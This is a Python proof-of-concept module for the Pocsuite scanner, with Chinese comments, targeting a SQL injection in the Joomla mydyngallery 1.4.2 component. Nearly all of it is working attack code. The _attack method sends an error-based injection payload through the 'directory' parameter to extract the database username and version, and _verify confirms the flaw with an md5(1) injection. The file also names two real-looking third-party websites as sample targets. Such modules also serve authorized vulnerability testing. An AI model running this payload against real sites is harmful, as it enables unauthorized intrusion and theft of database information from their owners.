#!/usr/bin/env python
# coding: utf-8
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
import re

class TestPOC(POCBase):
    vulID = '10171'  # ssvid
    version = '1.0'
    author = ['kikay']
    vulDate = '2008-12-05'
    createDate = '2016-01-09'
    updateDate = '2016-01-09'
    references = ['http://www.sebug.net/vuldb/ssvid-10171']
    name = 'Joomla Component mydyngallery 1.4.2 (directory) SQL Injection Vuln'
    appPowerLink = 'http://www.joomla.org'
    appName = 'Joomla!'
    appVersion = '1.4.2'
    vulType = 'SQL injection'
    desc = '''
        Joomla组件mydyngallery版本1.4.2在参数directory由于过滤不严格，存在SQL注入漏洞。
        远程攻击中可以利用该漏洞执行SQL指令，获取敏感信息。
    '''
    samples = ['http://www.lesgourmands.com','http://www.sebka.ca/w']

    def _attack(self):
        #利用SQL注入读取数据库信息
        result = {}
        #访问的地址
        exploit='/index.php?option=com_mydyngallery&directory='
        #利用floor错误回显的方式读取数据库信息
        payload="1' and 1=(SELECT 1 FROM(SELECT COUNT(*),CONCAT("\
        "(SELECT SUBSTRING(CONCAT(0x247e7e7e24,user(),0x2a2a2a,"\
        "version(),0x247e7e7e24),1,60)),FLOOR(RAND(0)*2))X FROM "\
        "information_schema.tables GROUP BY X)a) and '1'='1"
        #构造漏洞利用连接
        vulurl=self.url+exploit+payload
        #自定义的HTTP头
        httphead = {
          'User-Agent':'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
          'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Connection':'keep-alive'
        }
        #提取信息的正则表达式
        parttern='\$~~~\$([_a-zA-Z0-9].*)\*\*\*(.*)\$~~~\$'
        #发送请求
        resp=req.get(url=vulurl,headers=httphead,timeout=50)
        #检查是否含有特征字符串
        if 'Duplicate entry' in resp.content:
            #提取信息
            match=re.search(parttern,resp.content,re.M|re.I)
            if match:
                #漏洞利用成功
                result['DatabaseInfo']={}
                #数据库用户名
                result['DatabaseInfo']['Username']=match.group(1)
                #数据库版本
                result['DatabaseInfo']['Version']=match.group(2)
        return self.parse_output(result)

    def _verify(self):
        #通过计算md5(1)的值，来验证SQL注入
        result = {}
        #访问的地址
        exploit='/index.php?option=com_mydyngallery&directory='
        #利用floor错误回显的方式（计算md5(1)）
        payload="1' and 1=(SELECT 1 FROM(SELECT COUNT(*),CONCAT"\
        "((SELECT SUBSTRING(CONCAT(md5(1),0x247e7e7e24),1,60)),"\
        "FLOOR(RAND(0)*2))X FROM information_schema.tables GROUP BY X)a) and '1'='1"
        #构造漏洞利用连接
        vulurl=self.url+exploit+payload
        #自定义的HTTP头
        httphead = {
          'User-Agent':'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
          'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Connection':'keep-alive'
        }
        #发送请求
        resp=req.get(url=vulurl,headers=httphead,timeout=50)
        #检查是否含有特征字符串(md5(1)=c4ca4238a0b923820dcc509a6f75849b)
        if 'c4ca4238a0b923820dcc509a6f75849b' in resp.content:
            #漏洞验证成功
            result['VerifyInfo']={}
            result['VerifyInfo']['URL'] = self.url+exploit
            result['VerifyInfo']['Payload'] = payload
        return self.parse_output(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)